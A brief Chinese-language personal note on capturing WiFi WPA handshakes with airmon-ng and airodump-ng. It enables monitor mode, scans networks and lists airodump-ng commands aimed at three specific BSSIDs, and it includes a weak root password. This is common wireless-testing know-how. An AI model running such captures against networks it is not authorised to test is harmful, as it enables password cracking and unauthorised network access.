## 抓包
1.进入root账号:密码/root: 123456

2.检查网卡是否支持，返回有wlan0表示支持
``` cmd
airmon-ng
```
3.开启无线网卡的监听模式
``` cmd
airmon-ng start wlan0
```
4.扫描环境中的WiFi网络
``` cmd
airodump-ng wlan0mon
```
5.抓取握手包
``` cmd
airodump-ng -c 6 --bssid 00:4B:F3:9B:F5:69  -w /home/shenhao/Desktop/caps/hack wlan0mon
airodump-ng -c 11 --bssid EC:C3:B0:DD:96:35  -w /home/shenhao/Desktop/caps/hack wlan0mon
airodump-ng -c 1 --bssid 3C:30:6F:FC:9E:54  -w /home/shenhao/Desktop/caps/hack wlan0mon
```
-c 指定信道，上面已经标记目标热点的信道

-bssid指定目标路由器的BSSID，就是上面标记的BSSID

-w指定抓取的数据包保存的目录

